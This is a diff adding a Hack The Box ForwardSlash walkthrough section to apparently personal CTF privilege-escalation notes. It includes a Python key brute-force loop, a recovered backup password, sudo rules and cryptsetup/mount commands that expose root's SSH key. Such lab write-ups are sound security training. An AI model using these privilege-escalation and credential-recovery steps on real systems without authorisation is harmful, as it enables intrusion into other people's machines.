@@ -330,6 +330,35 @@ bash-4.4# cat root.txt
 0385b6629b30f8a673f7bb279fb1570b
 bash-4.4#
 ```
+## priv esc mounting backup image with password ciphertext key brute force -hack the box forward-slash:
+
+When we enumerate we find a file where it seems to be the encryption method for a ciphertext. We can make a script to brute force this:
+```python
+ciphertext = open('ciphertext', 'r').read().rstrip()
+for i in range(1, 165): # key length assuming that key is not greater than the length of encrypted ciphertext
+    for j in range(33, 127): # from ! to ~ (including all A-Z,a-z and 0-9)
+        key = chr(j) * i
+        msg = decrypt(key, ciphertext)
+        if 'the ' in msg or 'be ' in msg or 'and ' in msg or 'of ' in msg :
+            exit("Key: {0}, Key length: {1}, Msg: {2}".format(key, len(key), msg))
+```
+When we run this we get a password along with a folder which we then take a loo at.
+```bash
+/var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
+```
+This is also visible when running `sudo -l`
+```bash
+User pain may run the following commands on forwardslash:
+    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
+    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
+    (root) NOPASSWD: /bin/umount ./mnt/
+```
+So knowing the password we then mount it with:
+```bash
+sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
+sudo /bin/mount /dev/mapper/backup ./mnt/
+```
+And then we can simply go the the mounted folder and find the root shh key inside, we then ssh as root and read the flag!
 
 ## priv esc with ssh-key cracking - tryhackme box
 
